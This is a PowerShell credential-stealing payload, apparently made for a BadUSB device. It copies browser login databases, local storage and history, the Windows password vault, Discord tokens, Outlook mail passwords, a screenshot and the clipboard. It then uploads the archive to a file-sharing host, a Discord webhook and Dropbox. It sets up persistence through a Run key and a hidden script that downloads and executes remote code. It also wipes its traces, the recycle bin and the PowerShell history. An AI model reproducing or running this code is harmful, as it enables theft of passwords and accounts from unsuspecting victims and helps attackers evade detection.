	Get-Content -Path "$path\default\History" > "$env:TMP\$FolderName\Browsers\$Browser\default\History"
	Get-Content -Path "$path\default\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\default\Bookmarks"
	Copy-Item "$path\default\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Storage\leveldb" -Recurse
	Copy-Item "$path\default\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\Profile 1\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 1 -ItemType Directory
	Get-Content -Path "$path\Profile 1\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Web Data"
	Get-Content -Path "$path\Profile 1\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Login Data"
	Get-Content -Path "$path\Profile 1\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Preferences"
	Get-Content -Path "$path\Profile 1\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Top Sites"
	Get-Content -Path "$path\Profile 1\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\History"
	Get-Content -Path "$path\Profile 1\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Bookmarks"
	Copy-Item "$path\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Storage\leveldb" -Recurse
	Copy-Item "$path\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\Profile 2\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 2 -ItemType Directory
	Get-Content -Path "$path\Profile 2\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Web Data"
	Get-Content -Path "$path\Profile 2\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Login Data"
	Get-Content -Path "$path\Profile 2\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Preferences"
	Get-Content -Path "$path\Profile 2\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Top Sites"
	Get-Content -Path "$path\Profile 2\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\History"
	Get-Content -Path "$path\Profile 2\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Bookmarks"
	Copy-Item "$path\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Storage\leveldb" -Recurse
	Copy-Item "$path\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\Profile 3\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 3 -ItemType Directory
	Get-Content -Path "$path\Profile 3\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Web Data"
	Get-Content -Path "$path\Profile 3\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Login Data"
	Get-Content -Path "$path\Profile 3\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Preferences"
	Get-Content -Path "$path\Profile 3\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Top Sites"
	Get-Content -Path "$path\Profile 3\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\History"
	Get-Content -Path "$path\Profile 3\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Bookmarks"
	Copy-Item "$path\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Storage\leveldb" -Recurse
	Copy-Item "$path\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Sync Data\leveldb" -Recurse
}
}

# Get Edge Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Microsoft\Edge\User Data\Local State")){
taskkill /IM msedge.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"


[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$passwords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Select-Object username,resource,password | Format-Table | Out-String
Write-Output $passwords > "$env:TMP\$FolderName\Browsers\Edge\Passwords.txt"

}

# Get Brave Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\BraveSoftware\Brave-Browser\User Data\Local State")){
taskkill /IM brave.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\BraveSoftware\Brave-Browser" -Browser "Brave"
}

# Get Opera Passwords
$path="$env:appdata\Opera Software\Opera Stable"
if([System.IO.File]::Exists("$path\Local State")){
taskkill /IM opera.exe /F
taskkill /IM launcher.exe /F
Start-Sleep 1
$Browser="Opera"
New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
$localstate = "$path\Local State"
$logindata = "$path\Login Data"
$preferences = "$path\Preferences"
$leveldb = "$path\Local Storage\leveldb"
Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
$ldb = Get-ChildItem $lvdb\*.ldb
foreach ($file in $ldb) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$log = Get-ChildItem $lvdb\*.log
foreach ($file in $log) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$webdata = "$path\Web Data"
Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"

}

# Get Opera Crypto Passwords
$path="$env:appdata\Opera Software\Opera Crypto Stable"
if([System.IO.File]::Exists("$path\Local State")){
taskkill /IM opera.exe /F
taskkill /IM launcher.exe /F
Start-Sleep 1
$Browser="OperaCrypto"
New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
$localstate = "$path\Local State"
$logindata = "$path\Login Data"
$preferences = "$path\Preferences"
$leveldb = "$path\Local Storage\leveldb"
Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
$ldb = Get-ChildItem $lvdb\*.ldb
foreach ($file in $ldb) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$log = Get-ChildItem $lvdb\*.log
foreach ($file in $log) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$webdata = "$path\Web Data"
Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"

}

# Get OperaGX Passwords
$path="$env:appdata\Opera Software\Opera GX Stable"
if([System.IO.File]::Exists("$path\Local State")){
taskkill /IM opera.exe /F
taskkill /IM launcher.exe /F
Start-Sleep 1
$Browser="OperaGX"
New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
$localstate = "$path\Local State"
$logindata = "$path\Login Data"
$preferences = "$path\Preferences"
$leveldb = "$path\Local Storage\leveldb\"
Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
$ldb = Get-ChildItem $lvdb\*.ldb
foreach ($file in $ldb) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$log = Get-ChildItem $lvdb\*.log
foreach ($file in $log) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
}
$webdata = "$path\Web Data"
Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"
}

# Get Yandex Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Yandex\YandexBrowser\User Data\Local State")){
taskkill /IM browser.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
}

Compress-Archive -Path $env:tmp/$FolderName/Browsers -DestinationPath "$env:tmp/Browsers-$ZIP"

$text = "**Browsers**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Browsers-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Browsers" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Browsers-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

function discordStorage {
	[CmdletBinding()]
	param (
	[Parameter (Position=1,Mandatory = $True)]
	[string]$Path,
	[Parameter (Position=1,Mandatory = $True)]
	[string]$Browser
	)

New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
$localstate = "$path\Local State"
$localstorage = "$path\Local Storage\leveldb"
Copy-Item -path $localstorage -Destination "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
$ldb = Get-ChildItem $lvdb\*.ldb
foreach ($file in $ldb) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
}
$log = Get-ChildItem $lvdb\*.log
foreach ($file in $log) {
	$file=$file.Name
	$f="$lvdb\$file"
	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
}
Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
}

# Discord Token Grabbing

if([System.IO.File]::Exists("$env:appdata\discord\mute.png")){
taskkill /IM Discord.exe /F
discordStorage -Path "$env:appdata\discord" -Browser "Discord"
}
if([System.IO.File]::Exists("$env:appdata\discordcanary\mute.png")){
taskkill /IM DiscordCanary.exe /F
discordStorage -Path "$env:appdata\discordcanary" -Browser "DiscordCanary"
}
if([System.IO.File]::Exists("$env:appdata\discordptb\mute.png")){
taskkill /IM DiscordPTB.exe /F
discordStorage -Path "$env:appdata\discordptb" -Browser "DiscordPTB"
}

############################################################################################################################################################

# Get Screenshot
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
function Get-ScreenCapture
{
    param(
    [Switch]$OfWindow
    )


    begin {
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($OfWindow) {
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
        }
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()
        $ep = New-Object Drawing.Imaging.EncoderParameters
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
        $screenCapturePathBase = "$env:temp\$FolderName\Screenshot"
        $c = 0
        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
            $c++
        }
        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
    }
}

$ss = Get-ScreenCapture

# Outlook
function get-Outlook {
	$data=""
	try {
	$outlook1 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
	$email = $outlook1 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
	$imap = $outlook1 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
	$pop3 = $outlook1 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
	$http = $outlook1 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
	$smtp = $outlook1 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
	$smtpserv = $outlook1 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
	$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
	}

	catch {
		try {
		$outlook2 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
		$email = $outlook2 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
		$imap = $outlook2 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
		$pop3 = $outlook2 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
		$http = $outlook2 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
		$smtp = $outlook2 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
		$smtpserv = $outlook2 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
		$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
		}

		catch {
			try {
			$outlook3 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676" 
			$email = $outlook3 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
			$imap = $outlook3 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
			$pop3 = $outlook3 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
			$http = $outlook3 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
			$smtp = $outlook3 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
			$smtpserv = $outlook3 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
			$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
			}

			catch {
				try {
				$outlook4 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
				$email = $outlook4 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
				$imap = $outlook4 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
				$pop3 = $outlook4 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
				$http = $outlook4 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
				$smtp = $outlook4 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
				$smtpserv = $outlook4 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
				$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
				}

				catch {
				Write-Error "No Outlook"
				return $null
				-ErrorAction SilentlyContinue
				}
		}
		}
	}
	
	return $data
}

$outlook = get-Outlook
if ($outlook -ne $null) {
	$outlook >> $env:tmp/$FolderName/Gaming/OutlookData.txt
}

# Get Clipboard
Get-Clipboard > "$env:temp\$FolderName\Clipboard.txt";

# Clear clipboard of image
Set-Clipboard -Value $null

############################################################################################################################################################

Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP

# Upload output file to dropbox

function dropbox {
$TargetFilePath="/$ZIP"
$SourceFilePath="$env:TEMP\$ZIP"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){dropbox}

############################################################################################################################################################

# Upload file to temp file storage
$text = "**Final Data**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}

############################################################################################################################################################
 
# Setup Persistence if possible

function Test-RegistryValue {

	param (
	
	 [parameter(Mandatory=$true)]
	 [ValidateNotNullOrEmpty()]$Path,
	
	[parameter(Mandatory=$true)]
	 [ValidateNotNullOrEmpty()]$Value
	)
	
	try {
	
	Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
	 return $true
	 }
	
	catch {
	
	return $false
	
	}
	
}

if ($pers -eq 'True'){
	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
		$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
		$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
	}
	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
		$objShell = New-Object -COM WScript.Shell
		$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
		$target = "powershell"
		$args = "-Nop -Noni -w h -ep bypass -command `"$env:appdata\..\Local\msiserver.lnk`""
		$objShortCut.TargetPath = $target
		$objShortcut.Arguments = $args
		$objShortCut.Save()
	}
	$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
	$val = $env:USERPROFILE+"\msiserver.lnk"
	$testVal = Test-RegistryValue -Path $path -Value $val
	if ($testVal -eq $true){
	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
	New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
	}
}
if ($pers -eq 'Remove') {
	Remove-Item $env:appdata+"\..\Local\msiserver.ps1"
	Remove-Item $env:appdata+"\..\Local\msiserver.lnk"
	Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run" -Name "msiserver" -PropertyType "String"
}



############################################################################################################################################################

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete loot files 

Remove-Item $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\$FolderName -r -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\$ZIP -r -Force -ErrorAction SilentlyContinue

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Delete powershell history after all commands, to disguise all cleanup

Remove-Item (Get-PSreadlineOption).HistorySavePath

		
############################################################################################################################################################

# Popup message to signal the payload is done

#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
#if([System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
#$s=New-Object -ComObject SAPI.SpVoice
#$s.Speak("GG Loser smiley face")
#}